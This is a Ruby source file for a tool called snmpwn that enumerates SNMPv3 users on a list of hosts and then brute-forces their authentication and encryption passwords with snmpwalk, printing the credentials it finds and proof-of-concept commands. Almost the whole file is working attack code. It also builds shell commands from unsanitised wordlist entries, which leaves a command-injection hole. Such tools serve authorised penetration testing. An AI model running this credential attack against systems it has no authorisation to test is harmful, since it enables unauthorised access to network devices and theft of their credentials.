#!/usr/bin/env ruby
#SNMPwn
#SNMPv3 User Enumeration and Password Attack Script

require 'tty-command'
require 'trollop'
require 'colorize'
require 'logger' #need to log output to file instead of NULL

def arguments

  opts = Trollop::options do 
    version "snmpwn v0.96b".light_blue
    banner <<-EOS
    snmpwn v0.96b
      EOS

        opt :hosts, "SNMPv3 Server IP", :type => String #change to accept lists of hosts too
        opt :enum_users, "Emumerate SNMPv3 Users?" #may remove, not currently using
        opt :users, "List of users you want to try", :type => String
        opt :passlist, "Password list for attacks", :type => String
        opt :enclist, "Encryption Password List for AuthPriv types", :type => String
        opt :timeout, "Specify Timeout, for example 0.2 would be 200 milliseconds. Default 0.3", :default => 0.3
        opt :showfail, "Show failed password attacks"

        if ARGV.empty?
          puts "Need Help? Try ./snmpwn --help".red.bold
        exit
      end
    end
  opts
end

def findusers(arg, hostfile)
  users = []
  userfile = File.readlines(arg[:users]).map(&:chomp)
  log = Logger.new('userenum.log')
  cmd = TTY::Command.new(output: log)
  
  puts "\nEnumerating SNMPv3 users".light_blue.bold
  hostfile.each do |host|
    userfile.each do |user|
      out, err = cmd.run!("snmpwalk -u #{user} #{host} iso.3.6.1.2.1.1.1.0")
        if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
          puts "Username: '#{user}' is valid on #{host}".green.bold
          users << [user, host]
        elsif err =~ /authorizationError/i
          puts "Username: '#{user}' is valid on #{host}".green.bold
          users << [user, host]
        elsif err =~ /snmpwalk: Unknown user name/i
          puts "Username: '#{user}' is not configured on #{host}".red.bold
        end
      end
    end
  puts "\nValid Users:".green.bold
    users.each { |user| puts user.join("\t").light_green}
    users.each { |user| user.pop }.uniq!.flatten!
  users
end

def attack(arg, users, hostfile)
  passwords = File.readlines(arg[:passlist]).map(&:chomp)
  encryption_pass = File.readlines(arg[:enclist]).map(&:chomp)
  log = Logger.new('attack.log')
  cmd = TTY::Command.new(output: log)

  puts "\nTesting SNMPv3 without authentication and encryption".light_blue.bold
  hostfile.each do |host|
    users.each do |user|   
      out, err = cmd.run!("snmpwalk -u #{user} #{host} iso.3.6.1.2.1.1.1.0")
        if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
          puts "'#{user}' can connect without a password to host #{host}".green.bold
          puts "POC ---> snmpwalk -u #{user} #{host}".light_magenta
        end
      end
    end

  puts "\nTesting SNMPv3 with authentication and without encryption".light_blue.bold
  hostfile.each do |host|
    users.each do |user|
      passwords.each do |password|
        if password.length >= 8
          out, err = cmd.run!("snmpwalk -u #{user} -A #{password} #{host} -v3 iso.3.6.1.2.1.1.1.0 -l authnopriv")
            if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
              puts "'#{user}' can connect with the password '#{password}'".green.bold
              puts "POC ---> snmpwalk -u #{user} -A #{password} #{host} -v3 -l authnopriv".light_magenta
            end
          end
        end
      end
    end

  puts "\nTesting SNMPv3 with authentication and encryption MD5/DES".light_blue.bold
  valid = []
  valid << ["User".underline, "Password".underline, "Encryption".underline, "Host".underline]
  hostfile.each do |host|
    users.each do |user|
      passwords.each do |password|
        encryption_pass.each do |epass|
          if epass.length >= 8 && password.length >= 8
            out, err = cmd.run!("snmpwalk -u #{user} -A #{password} -X #{epass} #{host} -v3 iso.3.6.1.2.1.1.1.0 -l authpriv", timeout: arg[:timeout])
              if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
                puts "FOUND: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}, MD5/DES".green.bold
                puts "POC ---> snmpwalk -u #{user} -A #{password} -X #{epass} #{host} -v3 -l authpriv".light_magenta
                valid << [user, password, epass, host]
              else
                puts "FAILED: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}".red.bold
          end
        end
      end
    end
  end
end
puts "\nValid Users:".green.bold
valid.each { |valid| puts valid.join("\t").light_green}
puts "Finished, please use this information and tool responsibly".green.bold
end

arg = arguments
hostfile = File.readlines(arg[:hosts]).map(&:chomp)
users = findusers(arg, hostfile)
attack(arg, users, hostfile)